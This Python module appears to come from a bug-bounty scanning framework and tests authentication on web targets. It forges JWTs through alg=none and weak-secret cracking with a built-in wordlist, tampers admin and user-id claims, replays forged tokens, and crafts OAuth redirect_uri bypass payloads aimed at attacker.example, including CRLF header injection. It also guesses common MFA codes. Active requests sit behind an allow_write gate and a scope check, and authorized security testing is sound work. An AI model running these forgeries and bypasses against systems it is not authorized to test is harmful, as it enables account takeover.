"""AUTH depth kit -- JWT / session / OAuth / SAML / MFA / password-reset / ATO.

The kit drives ``tools/jwt_scanner.py`` (offline JWT forging + analysis) and
ports the OAuth ``redirect_uri`` / ``state`` patterns from
``tools/h1_oauth_tester.py``, routing *every* request through ``ctx.fetch`` so
the whole kit is unit-testable offline against a fake target.

Safety (README hard rules): offline JWT analysis is always allowed; any request
that sends a forged token, triggers a reset/OTP e-mail, or brute-forces a code
runs ONLY under ``ctx.allow_write`` -- otherwise the test is recorded as
``BLOCKED(reason)`` in the finding and the kit moves on. Raw tokens and secrets
NEVER enter a ``Finding``: evidence carries header names, alg, claim *keys* and
flags only.
"""
from __future__ import annotations

import os
import re
import sys

_REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)

from tools.hunter.contract import (  # noqa: E402
    Finding,
    HuntContext,
    register,
    V_CONFIRMED,
    V_POSSIBLE,
    V_PUBLIC,
    V_INCONCLUSIVE,
)
from tools.jwt_scanner import (  # noqa: E402
    analyze as jwt_analyze,
    crack_secret,
    decode as jwt_decode,
    forge_hs256_with_key,
    _encode_segment,
)

# --- vocabularies -----------------------------------------------------------
# Claim keys worth tampering for escalation / ATO (only the *keys* are ever
# recorded in evidence, never their values).
_FORGEABLE_CLAIMS = (
    "user_id", "uid", "sub", "role", "is_admin", "isAdmin", "admin",
    "scope", "permissions", "account_id", "tenant", "org", "email",
)
_ADMIN_CLAIMS = ("role", "is_admin", "isAdmin", "admin")

# Small built-in weak-secret list for offline HS256 cracking. jwt_scanner does
# the actual HMAC check; this is just the wordlist. Extended from ctx.kb if it
# exposes weak secrets. (The cracked value itself is never put in a Finding.)
_WEAK_SECRETS = (
    "secret", "password", "123456", "changeme", "admin", "key", "jwt",
    "token", "test", "default", "qwerty", "letmein", "root", "pass",
    "your-256-bit-secret", "your_jwt_secret", "supersecret", "s3cr3t",
    "hmac", "signature", "private", "my-secret", "shhhh", "dev", "secretkey",
)

_LOGIN_HINTS = ("login", "signin", "sign_in", "sign-in", "session", "auth",
                "token", "logout", "logoff")
_OAUTH_HINTS = ("oauth", "authoriz", "authorise", "callback", "connect/",
                "/sso", "openid", "/auth/")
_RESET_HINTS = ("reset", "forgot", "/password", "recover")
_MFA_HINTS = ("mfa", "otp", "2fa", "two-factor", "twofactor", "totp", "/verify")
_SAML_HINTS = ("saml", "/acs", "samlresponse", "/sso/saml", "idp")

_ATTACKER = "attacker.example"


# --- small helpers ----------------------------------------------------------
def _endpoints(ctx):
    out = []
    for ep in (ctx.endpoints or []):
        if isinstance(ep, dict):
            url = ep.get("url") or ep.get("path") or ""
            method = str(ep.get("method") or "GET").upper()
        else:
            url, method = str(ep), "GET"
        if url:
            out.append({"method": method, "url": url})
    return out


def _host(url):
    try:
        from urllib.parse import urlparse
        return (urlparse(url).hostname or "").lower()
    except Exception:
        return ""


def _in_scope(ctx, url):
    h = _host(url)
    return (not h) or ctx.in_scope(h)


def _endpoints_matching(ctx, hints):
    out = []
    for ep in _endpoints(ctx):
        low = ep["url"].lower()
        if any(h in low for h in hints):
            out.append(ep)
    return out


def _is_noise(ctx, resp):
    """True for an SPA catch-all shell (not a real endpoint / not a finding)."""
    if resp is None:
        return True
    base = ctx.baseline
    try:
        return bool(base and base.is_catchall(resp.status, resp.body))
    except Exception:
        return False


def _kb_secrets(ctx):
    try:
        words = getattr(ctx.kb, "weak_secrets", None)
        if callable(words):
            words = words()
        return [str(w) for w in (words or [])]
    except Exception:
        return []


# --- JWT extraction (header-safe; never logs the token) ---------------------
def _looks_like_jwt(tok):
    if not isinstance(tok, str) or tok.count(".") != 2:
        return False
    try:
        header, _payload, _sig = jwt_decode(tok)
    except Exception:
        return False
    return isinstance(header, dict) and "alg" in header


def _extract_jwt(headers):
    """Return (token, header_name) for the first JWT in a header set, else
    (None, None). Handles ``Authorization: Bearer <jwt>`` and cookie values."""
    for name, value in (headers or {}).items():
        if not isinstance(value, str):
            continue
        candidates = [value]
        if value.lower().startswith("bearer "):
            candidates.append(value[7:])
        for part in re.split(r"[;,\s]+", value):
            candidates.append(part)
            if "=" in part:
                candidates.append(part.split("=", 1)[1])
        for cand in candidates:
            cand = cand.strip().strip('"').strip("'")
            if _looks_like_jwt(cand):
                return cand, name
    return None, None


def _claim_keys(payload):
    return sorted(str(k) for k in payload.keys())


def _forgeable_claim_keys(payload):
    return [k for k in _FORGEABLE_CLAIMS if k in payload]


def _tamper(payload):
    """A minimal identity/privilege tamper set (synthetic values only)."""
    t = {}
    for k in ("user_id", "uid", "sub", "account_id"):
        if k in payload:
            orig = payload[k]
            if isinstance(orig, int):
                t[k] = orig + 1 if orig else 1
            else:
                s = str(orig)
                t[k] = (s[:-1] + ("1" if s[-1:] != "1" else "2")) if s else "1"
    for k in _ADMIN_CLAIMS:
        if k in payload:
            t[k] = "admin" if k == "role" else True
    if not t:
        t["user_id"] = "0"
    return t


def _forge(token, secret, alg):
    """Build a forged token string. Never stored in a Finding -- for replay
    only. Prefers a cracked-secret re-sign; falls back to alg:none strip."""
    header, payload, _sig = jwt_decode(token)
    tamper = _tamper(payload)
    if secret is not None:
        return forge_hs256_with_key(token, secret.encode(), tamper)
    h = dict(header)
    h["alg"] = "none"
    return "{}.{}.".format(_encode_segment(h), _encode_segment({**payload, **tamper}))


def _auth_header(name, original_value, token):
    """Rebuild the auth header carrying the forged token (never logged)."""
    if name.lower() == "authorization":
        return {name: "Bearer " + token}
    orig_tok, _ = _extract_jwt({name: original_value})
    if orig_tok and orig_tok in (original_value or ""):
        return {name: original_value.replace(orig_tok, token)}
    return {name: token}


def _protected_endpoint(ctx):
    eps = _endpoints(ctx)
    for ep in eps:
        low = ep["url"].lower()
        if any(k in low for k in ("/me", "/account", "/profile", "/admin",
                                  "/orders", "/user", "/api/")):
            if _in_scope(ctx, ep["url"]):
                return ep
    for ep in eps:
        if _in_scope(ctx, ep["url"]):
            return ep
    return None


# --- JWT class --------------------------------------------------------------
def _run_jwt(ctx):
    findings = []
    seen = set()
    for acct in (ctx.account_a, ctx.account_b):
        if not acct:
            continue
        token, hdr_name = _extract_jwt(acct.headers)
        if not token or token in seen:
            continue
        seen.add(token)
        try:
            header, payload, sig = jwt_decode(token)
        except Exception:
            continue
        alg = str(header.get("alg", "")).lower()
        forgeable = _forgeable_claim_keys(payload)

        # offline analysis via jwt_scanner (severities/count only -> no values)
        issues = jwt_analyze(token)

        vectors = ["alg_none_forge"]
        cracked = None
        if alg in ("none", ""):
            vectors.append("alg_none_at_issuer")
        if alg.startswith("hs"):
            cracked = crack_secret(token, list(_WEAK_SECRETS) + _kb_secrets(ctx))
            if cracked is not None:
                vectors.append("weak_hmac_key")
        if alg[:2] in ("rs", "es", "ps"):
            vectors.append("rs_to_hs_confusion")

        concrete_forge = (cracked is not None) or (alg in ("none", ""))
        if concrete_forge:
            severity, confidence = "high", "firm"
        else:
            severity, confidence = "medium", "tentative"
        if forgeable and concrete_forge:
            severity = "high"

        ev = {
            "account": acct.name,
            "auth_header_name": hdr_name,
            "alg": header.get("alg"),
            "has_signature": bool(sig),
            "has_exp": "exp" in payload,
            "claim_keys": _claim_keys(payload),
            "forgeable_claim_keys": forgeable,
            "vectors": sorted(set(vectors)),
            "weak_secret_cracked": cracked is not None,   # bool only
            "offline_issue_severities": sorted({i.severity for i in issues}),
            "offline_issue_count": len(issues),
            "replay": "not-attempted",
        }
        chain = []
        if forgeable:
            lead = "user_id" if "user_id" in forgeable else forgeable[0]
            chain.append("JWT {} tamper -> ATO".format(lead))

        build_desc = ("re-sign HS256 with the cracked weak key"
                      if cracked is not None
                      else "strip the signature and set alg=none")
        f = Finding(
            cls="jwt",
            title="Forgeable JWT ({})".format(header.get("alg")),
            severity=severity,
            confidence=confidence,
            axis="token-forgery",
            technique="+".join(sorted(set(vectors))),
            method="GET",
            url=ctx.base_url,
            evidence=ev,
            verdict=V_POSSIBLE,
            repro=[
                "Decode the account JWT (offline).",
                "Build a forgery: {}.".format(build_desc),
                "Tamper an identity/role claim ({}).".format(
                    ", ".join(forgeable) or "add user_id/role"),
                "Replay the forged token against a protected endpoint; "
                "acceptance confirms the bypass.",
            ],
            kill_reasons=["server acceptance not verified offline"],
            chain_hints=chain,
        )

        prot = _protected_endpoint(ctx)
        if not ctx.allow_write:
            f.evidence["replay"] = "BLOCKED: allow_write required"
            f.evidence["needs_verification"] = True
        elif ctx.fetch and prot and _in_scope(ctx, prot["url"]):
            _attempt_replay(ctx, f, token, hdr_name, acct, cracked, alg, prot)
        else:
            f.evidence["replay"] = "no protected endpoint / fetch available"
            f.evidence["needs_verification"] = True

        findings.append(f)
    return findings


def _attempt_replay(ctx, f, token, hdr_name, acct, cracked, alg, prot):
    """Send the forged token to a protected endpoint (gated by allow_write).

    False-positive guard: the endpoint must reject a no-token request, else it
    is public and a 200 to the forged token proves nothing."""
    url = prot["url"]
    method = prot.get("method", "GET")
    forged = _forge(token, cracked, alg)
    orig_val = (acct.headers or {}).get(hdr_name, "")

    noauth = ctx.fetch(method, url, headers={})
    accepted = ctx.fetch(method, url, headers=_auth_header(hdr_name, orig_val, forged))

    noauth_status = None if noauth is None else noauth.status
    acc_status = None if accepted is None else accepted.status
    f.method, f.url = method, url
    f.evidence["replay"] = "attempted"
    f.evidence["noauth_status"] = noauth_status
    f.evidence["replay_status"] = acc_status
    f.repro.append("Observed: no-auth -> {}, forged-token -> {}.".format(
        noauth_status, acc_status))

    enforced = noauth is not None and noauth.status in (401, 403)
    served = (accepted is not None and 200 <= accepted.status < 300
              and not _is_noise(ctx, accepted))

    if enforced and served:
        f.severity = "critical"
        f.confidence = "confirmed"
        f.verdict = V_CONFIRMED
        f.kill_reasons = []
        if not f.chain_hints:
            f.chain_hints = ["Forged JWT accepted -> ATO"]
    elif served and not enforced:
        f.verdict = V_PUBLIC
        f.confidence = "tentative"
        f.kill_reasons = ["endpoint also serves unauthenticated requests (public)"]
    else:
        f.verdict = V_POSSIBLE
        f.confidence = "tentative"
        f.kill_reasons = ["forged token rejected on replay ({})".format(acc_status)]


# --- session class ----------------------------------------------------------
def _set_cookie_values(resp):
    val = resp.header("Set-Cookie")
    if not val:
        return []
    return val if isinstance(val, list) else [val]


def _cookie_flags(cookie_line):
    low = cookie_line.lower()
    name = cookie_line.split("=", 1)[0].strip()
    m = re.search(r"samesite=([^;]+)", low)
    return {
        "name": name,
        "httponly": "httponly" in low,
        "secure": "secure" in low,
        "samesite": m.group(1).strip() if m else None,
    }


def _run_session(ctx):
    findings = []
    if ctx.fetch:
        targets = _endpoints_matching(ctx, _LOGIN_HINTS)
        if ctx.base_url:
            targets.append({"method": "GET", "url": ctx.base_url})
        done = set()
        for ep in targets:
            url = ep["url"]
            if not url or url in done or not _in_scope(ctx, url):
                continue
            done.add(url)
            resp = ctx.fetch("GET", url)
            if resp is None or _is_noise(ctx, resp):
                continue
            hit = False
            for line in _set_cookie_values(resp):
                flags = _cookie_flags(line)
                missing = [k for k in ("httponly", "secure") if not flags[k]]
                if not flags["samesite"]:
                    missing.append("samesite")
                if not missing:
                    continue
                hit = True
                strong = "httponly" in missing or "samesite" in missing
                findings.append(Finding(
                    cls="auth-session",
                    title="Session cookie missing flags: {}".format(", ".join(missing)),
                    severity="medium" if strong else "low",
                    confidence="firm",
                    axis="cookie-flags",
                    technique="set-cookie-attributes",
                    method="GET",
                    url=url,
                    evidence={
                        "cookie_name": flags["name"],
                        "httponly": flags["httponly"],
                        "secure": flags["secure"],
                        "samesite": flags["samesite"],
                        "missing": missing,
                    },
                    verdict=V_POSSIBLE,
                    repro=[
                        "Request {} and read the Set-Cookie header.".format(url),
                        "Cookie '{}' lacks: {}.".format(flags["name"], ", ".join(missing)),
                        "Missing HttpOnly -> theft via XSS; missing SameSite -> CSRF; "
                        "missing Secure -> sent over plain HTTP.",
                    ],
                    kill_reasons=[] if strong else ["low-impact flag only"],
                    chain_hints=(["Cookie stealable via XSS -> session hijack -> ATO"]
                                 if "httponly" in missing else []),
                ))
            if hit:
                break
    findings.extend(_session_reasoning(ctx))
    return findings


def _session_reasoning(ctx):
    out = []
    eps = _endpoints(ctx)
    logout = [e for e in eps if "logout" in e["url"].lower() or "logoff" in e["url"].lower()]
    login = _endpoints_matching(ctx, ("login", "signin", "sign_in", "sign-in"))
    token_present = bool(_extract_jwt(ctx.account_a.headers)[0]
                         or _extract_jwt(ctx.account_b.headers)[0])
    if logout and token_present:
        out.append(Finding(
            cls="auth-session",
            title="Logout may not invalidate the session token",
            severity="medium", confidence="tentative",
            axis="logout-invalidation", technique="token-replay-after-logout",
            method="POST", url=logout[0]["url"],
            evidence={
                "needs_verification": True,
                "test": "POST logout, then replay the prior token at a protected endpoint",
                "active_test": ("available" if ctx.allow_write
                                else "BLOCKED: allow_write required"),
            },
            verdict=V_INCONCLUSIVE,
            repro=[
                "Call the logout endpoint with the live session.",
                "Replay the pre-logout token against a protected endpoint.",
                "If it still succeeds, the token is not server-side invalidated.",
            ],
            kill_reasons=["requires a live session and allow_write to confirm"],
            chain_hints=["Non-invalidated token -> session replay -> ATO"],
        ))
    if login:
        out.append(Finding(
            cls="auth-session",
            title="Session-fixation reasoning (new session minted on login?)",
            severity="low", confidence="tentative",
            axis="session-fixation", technique="pre-auth-cookie-reuse",
            method="POST", url=login[0]["url"],
            evidence={"needs_verification": True,
                      "test": "compare the session cookie before and after authentication"},
            verdict=V_INCONCLUSIVE,
            repro=[
                "Capture the pre-login session cookie.",
                "Authenticate and compare; an unchanged identifier allows fixation.",
            ],
            kill_reasons=["requires an observed login response to confirm"],
        ))
    return out


# --- OAuth class (patterns ported from tools/h1_oauth_tester.py) ------------
def _redirect_uri_bypasses(legit, host):
    """redirect_uri mutation vectors, ported from
    h1_oauth_tester.check_redirect_uri_bypass but routed through ctx.fetch."""
    legit = legit or "https://{}/callback".format(host or "app.example")
    raw = [
        legit.replace(host, host + "." + _ATTACKER) if host else legit,
        legit + "@" + _ATTACKER,
        legit.replace(host, host + "%2F@" + _ATTACKER) if host else legit,
        "https://" + _ATTACKER + "/",
        legit + "%0d%0aLocation:https://" + _ATTACKER,
        legit + "/../" + _ATTACKER,
        legit + "#." + _ATTACKER,
    ]
    seen, uniq = set(), []
    for v in raw:
        if v not in seen:
            seen.add(v)
            uniq.append(v)
    return uniq


def _with_query(url, key, value):
    from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl
    parts = urlsplit(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[key] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path,
                       urlencode(q), parts.fragment))


def _oauth_finding(url, title, sev, conf, axis, tech, src, ev, repro,
                   verdict=V_POSSIBLE, kill=None, chain=None):
    e = {"pattern_source": src}
    e.update(ev)
    if kill is None:
        kill = [] if verdict == V_CONFIRMED else ["needs a live OAuth/IdP flow to confirm"]
    return Finding(cls="oauth", title=title, severity=sev, confidence=conf,
                   axis=axis, technique=tech, method="GET", url=url,
                   evidence=e, verdict=verdict, repro=list(repro),
                   kill_reasons=list(kill), chain_hints=list(chain or []))


def _run_oauth(ctx):
    eps = _endpoints_matching(ctx, _OAUTH_HINTS)
    if not eps or not ctx.fetch:
        return []
    pattern_source = "h1_oauth_tester(patterns)"
    try:
        from tools import h1_oauth_tester as _h1
        pattern_source = _h1.__name__.rsplit(".", 1)[-1]
    except Exception:
        pass

    url = eps[0]["url"]
    if not _in_scope(ctx, url):
        return []
    out = []
    host = _host(url)

    # 1) state presence / reuse / entropy (GET reads)
    states, first_location = [], ""
    for i in range(3):
        r = ctx.fetch("GET", url)
        if r is None:
            continue
        loc = r.header("Location") or ""
        if i == 0:
            first_location = loc
        m = re.search(r"[?&]state=([^&\s]+)", loc)
        states.append(m.group(1) if m else "")
    present = [s for s in states if s]
    if states and not present:
        out.append(_oauth_finding(
            url, "OAuth flow has no `state` parameter (CSRF)", "high", "firm",
            "oauth-state", "missing-state", pattern_source, {"state_seen": False},
            ["Initiate the OAuth flow and inspect the redirect for `state`.",
             "An absent `state` allows login CSRF / forced account linking."],
            chain=["Missing OAuth state -> login CSRF -> ATO"]))
    elif present and len(set(present)) < len(present):
        out.append(_oauth_finding(
            url, "OAuth `state` is reused across requests (CSRF)", "high", "firm",
            "oauth-state", "state-reuse", pattern_source,
            {"state_reused": True, "samples": len(present)},
            ["Initiate the OAuth flow several times.",
             "Repeated `state` values mean CSRF protection is ineffective."],
            chain=["Reused OAuth state -> CSRF -> ATO"]))
    elif present and min(len(s) for s in present) < 16:
        out.append(_oauth_finding(
            url, "OAuth `state` is short / may be predictable", "medium",
            "tentative", "oauth-state", "weak-state", pattern_source,
            {"min_len": min(len(s) for s in present)},
            ["Collect several `state` values and assess their entropy."]))

    # 2) redirect_uri open-redirect (ported vectors; GET reflection check)
    legit = ""
    m = re.search(r"[?&]redirect_uri=([^&\s]+)", url + " " + first_location)
    if m:
        from urllib.parse import unquote
        legit = unquote(m.group(1))
    reflected = False
    for vector in _redirect_uri_bypasses(legit, _host(legit) or host)[:3]:
        r = ctx.fetch("GET", _with_query(url, "redirect_uri", vector))
        if r is None:
            continue
        if _ATTACKER in (r.header("Location") or ""):
            reflected = True
            out.append(_oauth_finding(
                _with_query(url, "redirect_uri", vector),
                "OAuth redirect_uri open redirect (auth-code theft)", "high",
                "firm", "oauth-redirect", "redirect-uri-bypass", pattern_source,
                {"attacker_host_reflected": True},
                ["Supply a crafted redirect_uri to the authorise endpoint.",
                 "The server redirects to the attacker host, leaking the code."],
                verdict=V_CONFIRMED,
                chain=["OAuth redirect_uri -> auth-code theft -> ATO"]))
            break
    if not reflected:
        out.append(_oauth_finding(
            url, "OAuth redirect_uri handling needs verification", "info",
            "tentative", "oauth-redirect", "redirect-uri-review", pattern_source,
            {"needs_verification": True},
            ["Test redirect_uri mutation vectors in a live, intercepted flow."],
            verdict=V_INCONCLUSIVE))

    # 3) authorisation-code reuse -- cannot be tested offline
    out.append(_oauth_finding(
        url, "OAuth authorisation-code reuse needs verification", "info",
        "tentative", "oauth-code", "code-reuse", pattern_source,
        {"needs_verification": True},
        ["Capture an auth code and attempt to exchange it twice.",
         "A second successful exchange means codes are replayable."],
        verdict=V_INCONCLUSIVE))
    return out


# --- password reset ---------------------------------------------------------
def _run_reset(ctx):
    eps = _endpoints_matching(ctx, _RESET_HINTS)
    if not eps:
        return []
    url = eps[0]["url"]
    if not ctx.allow_write:
        return [Finding(
            cls="auth-session",
            title="Password-reset tests skipped (would e-mail a token)",
            severity="info", confidence="tentative", axis="password-reset",
            technique="reset-token-analysis", method="POST", url=url,
            evidence={"status": "BLOCKED",
                      "reason": "POST would trigger a reset e-mail; allow_write required",
                      "planned": ["token-in-response leak", "token predictability",
                                  "token reuse", "host-header reset poisoning"]},
            verdict=V_INCONCLUSIVE,
            repro=["Re-run with allow_write and an operator-owned account to test safely."],
            kill_reasons=["not executed (safety gate)"])]

    ident = ctx.account_a.user_id
    if not ident and isinstance(ctx.tech, dict):
        ident = ctx.tech.get("test_email", "")
    if not ident or not ctx.fetch or not _in_scope(ctx, url):
        return [Finding(
            cls="auth-session",
            title="Password-reset test not run (no operator-owned target)",
            severity="info", confidence="tentative", axis="password-reset",
            technique="reset-token-analysis", method="POST", url=url,
            evidence={"status": "BLOCKED",
                      "reason": "no operator-owned identifier to target safely"},
            verdict=V_INCONCLUSIVE,
            repro=["Provide account_a.user_id or ctx.tech['test_email']."],
            kill_reasons=["not executed (safety gate)"])]

    r = ctx.fetch("POST", url, body={"email": ident})
    ev = {"status": None if r is None else r.status}
    leaked = bool(r is not None and r.body and re.search(r"[A-Za-z0-9_\-]{24,}", r.body))
    ev["token_leaked_in_response"] = leaked        # bool only; never the token
    if leaked:
        return [Finding(
            cls="auth-session",
            title="Password-reset token returned in the response body",
            severity="high", confidence="firm", axis="password-reset",
            technique="reset-token-leak", method="POST", url=url,
            evidence=ev, verdict=V_POSSIBLE,
            repro=["POST a reset for an operator-owned account.",
                   "A long token-like string is present in the response body.",
                   "If it is the reset token, reset is possible without inbox access."],
            kill_reasons=["confirm the leaked value is the actual reset token"],
            chain_hints=["Reset-token leak in response -> ATO"])]
    return [Finding(
        cls="auth-session",
        title="Password-reset token analysis (no in-response leak observed)",
        severity="info", confidence="tentative", axis="password-reset",
        technique="reset-token-analysis", method="POST", url=url,
        evidence=ev, verdict=V_INCONCLUSIVE,
        repro=["Check the e-mailed token for predictability and reuse.",
               "Test host-header poisoning (X-Forwarded-Host) for reset-link hijack."],
        kill_reasons=["inbox-dependent checks need manual verification"])]


# --- MFA --------------------------------------------------------------------
def _mfa_bruteprobe(ctx, url):
    codes = ["000000", "123456", "111111"]
    statuses = []
    for c in codes:
        r = ctx.fetch("POST", url, body={"code": c, "otp": c})
        statuses.append(None if r is None else r.status)
    live = [s for s in statuses if s is not None]
    success = [s for s in live if 200 <= s < 300]
    if success and len(set(live)) > 1:
        return [Finding(
            cls="mfa", title="MFA code appears guessable (bounded probe)",
            severity="high", confidence="firm", axis="mfa-brute",
            technique="otp-bounded-guess", method="POST", url=url,
            evidence={"tried": len(codes), "success_shape": True},
            verdict=V_POSSIBLE,
            repro=["Submit a small set of common codes.",
                   "A success-shaped response indicates weak/absent rate-limiting."],
            kill_reasons=["confirm this is acceptance, not a generic 200"],
            chain_hints=["MFA brute -> second-factor bypass -> ATO"])]
    return [Finding(
        cls="mfa", title="MFA bounded code probe inconclusive",
        severity="info", confidence="tentative", axis="mfa-brute",
        technique="otp-bounded-guess", method="POST", url=url,
        evidence={"tried": len(codes), "success_shape": False},
        verdict=V_INCONCLUSIVE,
        repro=["Codes did not yield a success shape under a bounded probe."],
        kill_reasons=["no success-shaped response to guessed codes"])]


def _run_mfa(ctx):
    eps = _endpoints_matching(ctx, _MFA_HINTS)
    if not eps:
        return []
    url = eps[0]["url"]
    out = []
    if not ctx.allow_write:
        out.append(Finding(
            cls="mfa", title="MFA brute/guess not run (needs allow_write)",
            severity="info", confidence="tentative", axis="mfa-brute",
            technique="otp-bruteforce", method="POST", url=url,
            evidence={"status": "BLOCKED", "reason": "code guessing requires allow_write"},
            verdict=V_INCONCLUSIVE,
            repro=["Re-run with allow_write to attempt a bounded set of weak codes."],
            kill_reasons=["not executed (safety gate)"]))
    elif ctx.fetch and _in_scope(ctx, url):
        out.extend(_mfa_bruteprobe(ctx, url))
    out.append(Finding(
        cls="mfa", title="MFA bypass / step-skip reasoning",
        severity="medium", confidence="tentative", axis="mfa-bypass",
        technique="response-shape-and-forced-browse", method="POST", url=url,
        evidence={"needs_verification": True,
                  "checks": ["session token issued before the MFA step (response shape)",
                             "forced-browse to a post-MFA endpoint",
                             "backup-code reuse / small backup-code space"]},
        verdict=V_INCONCLUSIVE,
        repro=["Inspect the login response for a usable session before MFA.",
               "Reach a post-MFA endpoint directly with the pre-MFA session.",
               "If it succeeds, the MFA step is skippable."],
        kill_reasons=["requires live responses to confirm"]))
    return out


# --- SAML -------------------------------------------------------------------
def _run_saml(ctx):
    eps = _endpoints_matching(ctx, _SAML_HINTS)
    if not eps:
        return []
    ep = eps[0]
    return [Finding(
        cls="saml", title="SAML assertion-validation review",
        severity="medium", confidence="tentative", axis="saml",
        technique="xsw-and-signature-review", method=ep["method"], url=ep["url"],
        evidence={"needs_verification": True,
                  "checks": ["unsigned-assertion acceptance",
                             "XML signature wrapping (XSW)",
                             "NameID comment-injection",
                             "recipient/audience not enforced"]},
        verdict=V_INCONCLUSIVE,
        repro=["Capture a SAMLResponse and attempt signature-wrapping / unsigned variants.",
               "Replay to the ACS endpoint; acceptance of a tampered assertion is the bug."],
        kill_reasons=["requires a signed assertion and live IdP to confirm"])]


# --- ATO aggregation --------------------------------------------------------
_SEV_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


def _run_ato(ctx, findings):
    hints = []
    for f in findings:
        for h in (f.chain_hints or []):
            if h not in hints:
                hints.append(h)
    if not hints:
        return []
    confirmed = any(f.verdict == V_CONFIRMED for f in findings)
    top = max((_SEV_ORDER.get(f.severity, 0) for f in findings), default=0)
    sev = next(k for k, v in _SEV_ORDER.items() if v == top)
    return [Finding(
        cls="ato",
        title="Account-takeover chain(s): {} lead(s)".format(len(hints)),
        severity=sev,
        confidence="confirmed" if confirmed else "tentative",
        axis="chain",
        technique="ato-aggregation",
        method="GET",
        url=ctx.base_url,
        evidence={"leads": hints, "built_from": sorted({f.cls for f in findings})},
        verdict=V_CONFIRMED if confirmed else V_POSSIBLE,
        repro=["Combine the component findings into an end-to-end takeover:",
               *[" - " + h for h in hints]],
        kill_reasons=[] if confirmed else ["component findings need verification"],
        chain_hints=hints)]


# --- the kit ----------------------------------------------------------------
class AuthKit:
    """Depth kit for the authentication family."""

    name = "auth"
    classes = ("jwt", "oauth", "auth-session", "mfa", "ato", "saml")

    def applicable(self, ctx: HuntContext) -> bool:
        if _extract_jwt(ctx.account_a.headers)[0] or _extract_jwt(ctx.account_b.headers)[0]:
            return True
        if bool(ctx.account_a) or bool(ctx.account_b):
            return True
        hints = (_LOGIN_HINTS + _OAUTH_HINTS + _RESET_HINTS
                 + _MFA_HINTS + _SAML_HINTS)
        return bool(_endpoints_matching(ctx, hints))

    def run(self, ctx: HuntContext) -> list:
        findings = []
        findings.extend(_run_jwt(ctx))
        findings.extend(_run_session(ctx))
        findings.extend(_run_oauth(ctx))
        findings.extend(_run_reset(ctx))
        findings.extend(_run_mfa(ctx))
        findings.extend(_run_saml(ctx))
        findings.extend(_run_ato(ctx, findings))
        return findings


kit = register(AuthKit())
